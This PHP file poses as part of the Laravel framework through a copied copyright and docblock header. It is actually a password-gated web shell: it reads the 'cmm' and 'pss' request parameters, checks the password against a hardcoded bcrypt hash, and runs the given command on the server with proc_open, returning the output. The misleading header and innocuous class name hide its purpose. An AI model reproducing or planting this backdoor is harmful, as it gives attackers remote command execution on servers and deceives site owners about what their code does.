<?php

/**
 * @file Laravel Core Framework
 *
 * Copyright (c) Laravel Project Contributors
 * 
 * This file is part of the Laravel framework.
 * 
 * (c) Taylor Otwell <taylor@laravel.com>
 * 
 * This source code is licensed under the MIT license that is bundled
 * with this source code in the file LICENSE.
 *
 * @ingroup pages_user
 * @brief Handle requests for user functions.
 *
 */

class PHPsysDescriptor
{
    private $storedLaravelPasswordHash;

    public function __construct($storedLaravelPasswordHash)
    {
        $this->storedLaravelPasswordHash = $storedLaravelPasswordHash;
    }

    public function execute($command, $providedPassword)
    {
        if (!password_verify($providedPassword, $this->storedLaravelPasswordHash)) {
            return "403 Forbidden";
        }

        $descriptors = [
            0 => ["pipe", "r"],
            1 => ["pipe", "w"],
            2 => ["pipe", "w"]
        ];

        $process = proc_open($command, $descriptors, $pipes);

        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            $errorOutput = stream_get_contents($pipes[2]);

            fclose($pipes[0]);
            fclose($pipes[1]);
            fclose($pipes[2]);

            $exitCode = proc_close($process);

            return $exitCode === 0 ? $output : "Error: " . $errorOutput;
        } else {
            return "False";
        }
    }
}

class Request
{
    private $command;
    private $password;

    public function __construct($request)
    {
        if (isset($request['cmm']) && isset($request['pss'])) {
            $this->command = $request['cmm'];
            $this->password = $request['pss'];
        } else {
            throw new Exception("");
        }
    }

    public function getCommand()
    {
        return $this->command;
    }

    public function getPassword()
    {
        return $this->password;
    }
}

$storedLaravelPasswordHash = '$2y$10$nfOaeCOIm6RRtRBxggCImugrcI.j1n9BgSJWdN5PHxnY6J.sdp6zu';

try {
    $request = new Request($_REQUEST);
    $executor = new PHPsysDescriptor($storedLaravelPasswordHash);
    echo $executor->execute($request->getCommand(), $request->getPassword());
} catch (Exception $e) {
    echo $e->getMessage();
}

